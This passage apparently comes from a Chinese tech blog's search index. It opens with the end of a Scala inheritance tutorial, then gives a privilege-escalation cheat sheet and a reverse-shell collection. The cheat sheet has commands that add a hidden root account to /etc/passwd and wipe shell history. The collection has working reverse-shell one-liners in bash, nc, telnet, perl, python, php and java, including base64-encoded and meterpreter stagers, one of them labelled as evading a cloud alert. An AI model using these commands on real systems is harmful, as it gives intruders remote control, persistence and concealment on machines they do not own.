punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// ç§»åˆ°ä¸€ä¸ªæ–°çš„ä½ç½®</span>      pt<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-ç»§æ‰¿"><a href="#3-ç»§æ‰¿" class="headerlink" title="3. ç»§æ‰¿"></a>3. ç»§æ‰¿</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Point<span class="token punctuation">(</span>xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">var</span> x<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> xc   <span class="token keyword">var</span> y<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> yc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      println <span class="token punctuation">(</span><span class="token string">"x çš„åæ ‡ç‚¹: "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y çš„åæ ‡ç‚¹: "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> Location<span class="token punctuation">(</span><span class="token keyword">override</span> <span class="token keyword">val</span> xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> <span class="token keyword">override</span> <span class="token keyword">val</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span>   <span class="token keyword">val</span> zc <span class="token operator">:</span><span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token keyword">extends</span> Point<span class="token punctuation">(</span>xc<span class="token punctuation">,</span> yc<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> z<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> zc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dz<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      z <span class="token operator">=</span> z <span class="token operator">+</span> dz      println <span class="token punctuation">(</span><span class="token string">"x çš„åæ ‡ç‚¹ : "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y çš„åæ ‡ç‚¹ : "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"z çš„åæ ‡ç‚¹ : "</span> <span class="token operator">+</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-é‡å†™"><a href="#4-é‡å†™" class="headerlink" title="4. é‡å†™"></a>4. é‡å†™</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Person <span class="token punctuation">{</span>  <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">override</span> <span class="token keyword">def</span> toString <span class="token operator">=</span> getClass<span class="token punctuation">.</span>getName <span class="token operator">+</span> <span class="token string">"[name="</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">}</span><span class="token keyword">class</span> Employee <span class="token keyword">extends</span> Person <span class="token punctuation">{</span>  <span class="token keyword">var</span> salary <span class="token operator">=</span> <span class="token number">0.0</span>  <span class="token keyword">override</span> <span class="token keyword">def</span> toString <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span>toString <span class="token operator">+</span> <span class="token string">"[salary="</span> <span class="token operator">+</span> salary <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">}</span><span class="token keyword">object</span> Test <span class="token keyword">extends</span> App <span class="token punctuation">{</span>  <span class="token keyword">val</span> fred <span class="token operator">=</span> <span class="token keyword">new</span> Employee  fred<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Fred"</span>  fred<span class="token punctuation">.</span>salary <span class="token operator">=</span> <span class="token number">50000</span>  println<span class="token punctuation">(</span>fred<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
            <tag> Scala </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ææƒåˆé›†</title>
      <link href="/post/32a72de7.html"/>
      <url>/post/32a72de7.html</url>
      
        <content type="html"><![CDATA[<h1 id="ææƒåˆé›†"><a href="#ææƒåˆé›†" class="headerlink" title="ææƒåˆé›†"></a>ææƒåˆé›†</h1><h3 id="ä¸€ã€ææƒèµ„æº"><a href="#ä¸€ã€ææƒèµ„æº" class="headerlink" title="ä¸€ã€ææƒèµ„æº"></a>ä¸€ã€ææƒèµ„æº</h3><p>Linux-kernel-exploitsï¼š<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br>windows-kernel-exploitsï¼š<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br>æ¼æ´åˆ©ç”¨æœç´¢å¼•æ“ï¼š<a href="https://sploitus.com/">https://sploitus.com/</a><br>Exploit Databaseï¼š<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>Vulnerability &amp; Exploit Databaseï¼š<a href="https://www.rapid7.com/db/?type=metasploit">https://www.rapid7.com/db/?type=metasploit</a><br>Har-siaï¼š<a href="https://har-sia.info/index-en.html">https://har-sia.info/index-en.html</a><br>GTFOBinsï¼š<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="äºŒã€ææƒå‘½ä»¤åˆé›†"><a href="#äºŒã€ææƒå‘½ä»¤åˆé›†" class="headerlink" title="äºŒã€ææƒå‘½ä»¤åˆé›†"></a>äºŒã€ææƒå‘½ä»¤åˆé›†</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>è·å–åŸºæœ¬ä¿¡æ¯</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬</span>lsb_release -a<span class="token comment" spellcheck="true"># æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</span><span class="token function">uname</span> -a<span class="token comment" spellcheck="true"># æŸ¥æ‰¾å¯ä»¥ç”¨æ¥ææƒçš„SUIDæ–‡ä»¶</span><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null<span class="token comment" spellcheck="true"># æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œæ‰¾åˆ°æœ‰ä¿®æ”¹æƒé™çš„è®¡åˆ’ä»»åŠ¡è„šæœ¬</span><span class="token function">ls</span> -l /etc/cron*<span class="token function">more</span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ·»åŠ æ™®é€šç”¨æˆ·</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„æ™®é€šç”¨æˆ·</span><span class="token function">useradd</span> -p `openssl <span class="token function">passwd</span> -1 -salt <span class="token string">'salt'</span> 123456` guest<span class="token comment" spellcheck="true"># useradd -p æ–¹æ³•  ` ` æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤,"$()"ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥</span><span class="token function">useradd</span> -p <span class="token string">"<span class="token variable"><span class="token variable">$(</span>openssl <span class="token function">passwd</span> -1 123456<span class="token variable">)</span></span>"</span> guest<span class="token comment" spellcheck="true"># chpasswdæ–¹æ³•</span><span class="token function">useradd</span> guest<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'guest:123456'</span><span class="token operator">|</span>chpasswd<span class="token comment" spellcheck="true"># echo -eæ–¹æ³•</span><span class="token function">useradd</span> <span class="token function">test</span><span class="token punctuation">;</span><span class="token keyword">echo</span> -e <span class="token string">"123456\n123456\n"</span> <span class="token operator">|</span><span class="token function">passwd</span> <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæŠŠæˆ‘ä»¬æ·»åŠ çš„ç”¨æˆ·èµ‹äºˆ <strong>root</strong> æƒé™</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"guest:x:0:0::/:/bin/sh"</span> <span class="token operator">>></span> /etc/passwd<span class="token keyword">echo</span> <span class="token string">'guest:123456'</span><span class="token operator">|</span>chpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç›´æ¥æ·»åŠ  <strong>root</strong> ç”¨æˆ·</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç 123456çš„rootç”¨æˆ·</span><span class="token function">useradd</span> -p `openssl <span class="token function">passwd</span> -1 -salt <span class="token string">'salt'</span> 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="æ— ç—•ç»ˆç«¯æ“ä½œ"><a href="#æ— ç—•ç»ˆç«¯æ“ä½œ" class="headerlink" title="æ— ç—•ç»ˆç«¯æ“ä½œ"></a>æ— ç—•ç»ˆç«¯æ“ä½œ</h4><p>æ‰§è¡Œå®Œæˆåå½“å‰ç»ˆç«¯æ‰€æœ‰æ“ä½œä¸è¢«è®°å½•</p><pre class="line-numbers language-bash"><code class="language-bash">unset HISTORY HISTFILE HISTLOG HISTSAVES<span class="token function">export</span> HISTFILE<span class="token operator">=</span>/dev/null<span class="token function">export</span> HISTSIZE<span class="token operator">=</span>0<span class="token function">export</span> HISTFILESIZE<span class="token operator">=</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸‰ã€Exp-ä½¿ç”¨ä¸‰éƒ¨æ›²"><a href="#ä¸‰ã€Exp-ä½¿ç”¨ä¸‰éƒ¨æ›²" class="headerlink" title="ä¸‰ã€Exp ä½¿ç”¨ä¸‰éƒ¨æ›²"></a>ä¸‰ã€Exp ä½¿ç”¨ä¸‰éƒ¨æ›²</h3><pre class="line-numbers language-bash"><code class="language-bash">gcc exp.c -o expchomd +x exp./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å››ã€linux-ææƒè¾…åŠ©å·¥å…·"><a href="#å››ã€linux-ææƒè¾…åŠ©å·¥å…·" class="headerlink" title="å››ã€linux ææƒè¾…åŠ©å·¥å…·"></a>å››ã€linux ææƒè¾…åŠ©å·¥å…·</h3><ol><li>les - è¯¥å·¥å…·ä¸»è¦å¸®åŠ©æ£€æµ‹ linux å†…æ ¸çš„å®‰å…¨ç¼ºé™·</li></ol><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><ol start="2"><li>LinEnum - ææƒä¿¡æ¯æ”¶é›†</li></ol><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h3 id="äº”ã€Windows-ä¸‹çš„æƒé™åˆ’åˆ†"><a href="#äº”ã€Windows-ä¸‹çš„æƒé™åˆ’åˆ†" class="headerlink" title="äº”ã€Windows ä¸‹çš„æƒé™åˆ’åˆ†"></a>äº”ã€Windows ä¸‹çš„æƒé™åˆ’åˆ†</h3><p>Windows æ˜¯ä¸€ä¸ªæ”¯æŒå¤šç”¨æˆ·ã€å¤šä»»åŠ¡çš„æ“ä½œç³»ç»Ÿï¼Œè¿™æ˜¯æƒé™è®¾ç½®çš„åŸºç¡€ï¼Œä¸€åˆ‡æƒé™è®¾ç½®éƒ½æ˜¯åŸºäºç”¨æˆ·å’Œè¿›ç¨‹è€Œè¨€çš„ï¼Œä¸åŒçš„ç”¨æˆ·åœ¨è®¿é—®è¿™å°è®¡ç®—æœºæ—¶ï¼Œå°†ä¼šæœ‰ä¸åŒçš„æƒé™ã€‚<br><strong>WindowsNT ç”¨æˆ·ç»„ï¼š</strong></p><ul><li><code>Administrators</code>ï¼šç®¡ç†å‘˜ç»„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒAdministrators ä¸­çš„ç”¨æˆ·å¯¹è®¡ç®—æœº/åŸŸæœ‰ä¸å—é™åˆ¶çš„å®Œå…¨è®¿é—®æƒã€‚</li><li><code>Power Users</code>ï¼šé«˜çº§ç”¨æˆ·ç»„ï¼ŒPower Users å¯ä»¥æ‰§è¡Œé™¤äº†ä¸º Administrators ç»„ä¿ç•™çš„ä»»åŠ¡å¤–çš„å…¶ä»–ä»»ä½•æ“ä½œç³»ç»Ÿä»»åŠ¡ã€‚</li><li><code>Users</code>ï¼šæ™®é€šç”¨æˆ·ç»„ï¼Œè¿™ä¸ªç»„çš„ç”¨æˆ·æ— æ³•è¿›è¡Œæœ‰æ„æˆ–æ— æ„çš„æ”¹åŠ¨ã€‚</li><li><code>Guests</code>ï¼šæ¥å®¾ç»„ï¼Œæ¥å®¾è·Ÿæ™®é€š Users çš„æˆå‘˜æœ‰åŒç­‰è®¿é—®æƒï¼Œä½†æ¥å®¾å¸æˆ·çš„é™åˆ¶æ›´å¤š</li><li><code>Everyone</code>ï¼šæ‰€æœ‰çš„ç”¨æˆ·ï¼Œè¿™ä¸ªè®¡ç®—æœºä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚</li></ul><p>â€‹</p><h3 id="å…­ã€Linux-ä¸‹çš„æƒé™åˆ’åˆ†"><a href="#å…­ã€Linux-ä¸‹çš„æƒé™åˆ’åˆ†" class="headerlink" title="å…­ã€Linux ä¸‹çš„æƒé™åˆ’åˆ†"></a>å…­ã€Linux ä¸‹çš„æƒé™åˆ’åˆ†</h3><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·æ˜¯åˆ†è§’è‰²çš„ï¼Œè§’è‰²ä¸åŒï¼Œå¯¹åº”æƒé™ä¸åŒã€‚ç”¨æˆ·è§’è‰²é€šè¿‡ UID å’Œ GID è¯†åˆ«ã€‚ç‰¹åˆ«æ˜¯ UIDï¼Œä¸€ä¸ª UID æ˜¯å”¯ä¸€æ ‡è¯†ä¸€ä¸ªç³»ç»Ÿç”¨æˆ·çš„è´¦å·ã€‚</p><ul><li><code>è¶…çº§ç”¨æˆ·ï¼ˆ0ï¼‰</code>ï¼šé»˜è®¤æ˜¯ root ç”¨æˆ·ï¼Œå…¶ UID å’Œ GID éƒ½æ˜¯ 0ã€‚root ç”¨æˆ·åœ¨æ¯å° Unix å’Œ Linux ç³»ç»Ÿä¸­éƒ½æ˜¯å”¯ä¸€ä¸”çœŸæ˜¯å­˜åœ¨çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥ç™»é™†ç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿä¸­ä»»ä½•æ–‡ä»¶æ‰§è¡Œç³»ç»Ÿä¸­ä»»ä½•å‘½ä»¤ï¼Œæ‹¥æœ‰æœ€é«˜ç®¡ç†æƒé™ã€‚</li><li><code>æ™®é€šç”¨æˆ·ï¼ˆ1~499/1~999ï¼‰</code>ï¼šç³»ç»Ÿä¸­å¤§å¤šæ•°ç”¨æˆ·éƒ½æ˜¯æ™®é€šç”¨æˆ·ï¼Œå®é™…ä¸­ä¹Ÿä¸€èˆ¬ä½¿ç”¨æ™®é€šç”¨æˆ·æ“ä½œï¼Œéœ€è¦æƒé™æ˜¯ç”¨ sudo å‘½ä»¤æå‡æƒé™ã€‚</li><li><code>è™šæ‹Ÿç”¨æˆ·ï¼ˆ500~65535/1000~65535ï¼‰</code>ï¼šä¸çœŸå®çš„æ™®é€šç”¨æˆ·åŒºåˆ†å¼€æ¥ï¼Œè¿™ç±»ç”¨æˆ·æœ€å¤§ç‰¹ç‚¹æ˜¯å®‰è£…ç³»ç»Ÿåé»˜è®¤å°±ä¼šå­˜åœ¨ï¼Œä¸”é»˜è®¤æƒ…å†µå¤§å¤šæ•°ä¸èƒ½ç™»é™†ç³»ç»Ÿï¼Œå…¶åœ¨/etc/passwd æ–‡ä»¶ä¸­ï¼Œæœ€åå­—æ®µä¸º/sbin/nologinã€‚æ˜¯ç³»ç»Ÿæ­£å¸¸è¿è¡Œä¸å¯ç¼ºå°‘çš„ï¼Œä¸»è¦æ˜¯æ–¹ä¾¿ç³»ç»Ÿç®¡ç†ï¼Œæ»¡è¶³ç›¸åº”çš„ç³»ç»Ÿè¿›ç¨‹å¯¹æ–‡ä»¶å±ä¸»çš„è¦æ±‚</li></ul><p>â€‹</p><h3 id="ä¸ƒã€ä½¿ç”¨-python-å¿«é€Ÿå¼€å¯-http-æœåŠ¡å™¨"><a href="#ä¸ƒã€ä½¿ç”¨-python-å¿«é€Ÿå¼€å¯-http-æœåŠ¡å™¨" class="headerlink" title="ä¸ƒã€ä½¿ç”¨ python å¿«é€Ÿå¼€å¯ http æœåŠ¡å™¨"></a>ä¸ƒã€ä½¿ç”¨ python å¿«é€Ÿå¼€å¯ http æœåŠ¡å™¨</h3><p>åœ¨å½“å‰ç›®å½•å¼€å¯ <strong>http</strong> æœåŠ¡ï¼š</p><ol><li>åŸºäº <strong>python2.x</strong></li></ol><pre><code>python2 -m SimpleHTTPServer 8000</code></pre><ol start="2"><li>åŸºäº <strong>Python3.x</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">python3 -m http.server 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shellæ–¹å¼æ”¶é›†</title>
      <link href="/post/50f9aa58.html"/>
      <url>/post/50f9aa58.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-æ”»å‡»æœº-nc-ç›‘å¬"><a href="#0x00-æ”»å‡»æœº-nc-ç›‘å¬" class="headerlink" title="0x00 æ”»å‡»æœº nc ç›‘å¬"></a>0x00 æ”»å‡»æœº nc ç›‘å¬</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -nvlp 443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-n: ä¸åå‘è§£æ dnsï¼Œå³ä¸é€šè¿‡ ip è§£æåŸŸå no dns<br>-v: è¯¦ç»†ä¿¡æ¯è¾“å‡º verbose<br>-l: ç›‘å¬ listen<br>-p: æŒ‡å®šç«¯å£ port</p><h3 id="0x01-å¸¸ç”¨-Shell"><a href="#0x01-å¸¸ç”¨-Shell" class="headerlink" title="0x01 å¸¸ç”¨ Shell"></a>0x01 å¸¸ç”¨ Shell</h3><h4 id="1-Linux-Mac-OS"><a href="#1-Linux-Mac-OS" class="headerlink" title="1. Linux/Mac OS"></a>1. Linux/Mac OS</h4><p>æŸ¥çœ‹å…¨éƒ¨ shellï¼š<em>cat /etc/shells</em></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sh</span>/bin/sh<span class="token comment" spellcheck="true"># bash</span>/bin/bash/usr/bin/bash<span class="token comment" spellcheck="true"># rbash</span>/bin/rbash/usr/bin/rbash<span class="token comment" spellcheck="true"># dash</span>/bin/dash/usr/bin/dash<span class="token comment" spellcheck="true"># Other</span>/usr/bin/screen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-Windows"><a href="#2-Windows" class="headerlink" title="2. Windows"></a>2. Windows</h4><pre class="line-numbers language-powershell"><code class="language-powershell">cmdpowershell<span class="token comment" spellcheck="true"># shellè·¯å¾„</span>C:<span class="token operator">/</span>Windows<span class="token operator">/</span>System32<span class="token operator">/</span>cmd<span class="token punctuation">.</span>exeC:<span class="token operator">/</span>Windows<span class="token operator">/</span>System32<span class="token operator">/</span>WindowsPowerShell<span class="token operator">/</span>v1<span class="token punctuation">.</span>0<span class="token operator">/</span>powershell<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-å„ç§åå¼¹æ–¹å¼"><a href="#0x02-å„ç§åå¼¹æ–¹å¼" class="headerlink" title="0x02 å„ç§åå¼¹æ–¹å¼"></a>0x02 å„ç§åå¼¹æ–¹å¼</h3><h4 id="1-bash-åå¼¹"><a href="#1-bash-åå¼¹" class="headerlink" title="1. bash åå¼¹"></a>1. bash åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/AttackerIp/AttackerPort 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 ç‰ˆ</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMTU5LjQyLjI0LzgwIDA+JjE=}|{base64,-d}|{bash,-i}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-nc-åå¼¹"><a href="#2-nc-åå¼¹" class="headerlink" title="2. nc åå¼¹"></a>2. nc åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh AttackerIp AttackerPort<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-e: æŒ‡å®š nc è¿æ¥æˆåŠŸåæ‰§è¡Œçš„ç¨‹åº</p><h4 id="3-telnet-åå¼¹-nc-ä¸å¯ç”¨æˆ–-dev-tcp-ä¸å¯ç”¨æ—¶"><a href="#3-telnet-åå¼¹-nc-ä¸å¯ç”¨æˆ–-dev-tcp-ä¸å¯ç”¨æ—¶" class="headerlink" title="3. telnet åå¼¹(nc ä¸å¯ç”¨æˆ–/dev/tcp ä¸å¯ç”¨æ—¶)"></a>3. telnet åå¼¹(nc ä¸å¯ç”¨æˆ–/dev/tcp ä¸å¯ç”¨æ—¶)</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> telnet attackerip 8080 0<span class="token operator">&lt;</span>backpipe <span class="token operator">|</span> /bin/bash 1<span class="token operator">></span>backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-perl-åå¼¹"><a href="#4-perl-åå¼¹" class="headerlink" title="4. perl åå¼¹"></a>4. perl åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="attackerip";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ä¾èµ–äº/bin/sh çš„ shellï¼š ***è¿™æ¡è¯­å¥æ¯”ä¸Šé¢çš„æ›´ä¸ºç®€çŸ­ï¼Œè€Œä¸”ç¡®å®ä¸éœ€è¦ä¾èµ–/bin/sh</p><pre class="line-numbers language-bash"><code class="language-bash">perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-python-åå¼¹ï¼ˆäº‘ç›¾ä¸æŠ¥è­¦ï¼‰"><a href="#5-python-åå¼¹ï¼ˆäº‘ç›¾ä¸æŠ¥è­¦ï¼‰" class="headerlink" title="5. python åå¼¹ï¼ˆäº‘ç›¾ä¸æŠ¥è­¦ï¼‰"></a>5. python åå¼¹ï¼ˆäº‘ç›¾ä¸æŠ¥è­¦ï¼‰</h4><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"attackerip"<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦å¤–çš„å½¢å¼ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect<span class="token variable"><span class="token punctuation">((</span>'attackerip'<span class="token punctuation">,</span><span class="token number">9000</span><span class="token punctuation">))</span></span>\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦å¤– Metasploit ç‰ˆçš„ä»£ç ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>attackerip LPORT<span class="token operator">=</span>1234<span class="token function">import</span> base64<span class="token punctuation">;</span> exec<span class="token punctuation">(</span>base64.b64decode<span class="token punctuation">(</span><span class="token string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-php-åå¼¹"><a href="#6-php-åå¼¹" class="headerlink" title="6. php åå¼¹"></a>6. php åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("attackerip",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-java-åå¼¹"><a href="#7-java-åå¼¹" class="headerlink" title="7. java åå¼¹"></a>7. java åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/attackerip/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-ruby-åå¼¹"><a href="#8-ruby-åå¼¹" class="headerlink" title="8. ruby åå¼¹"></a>8. ruby 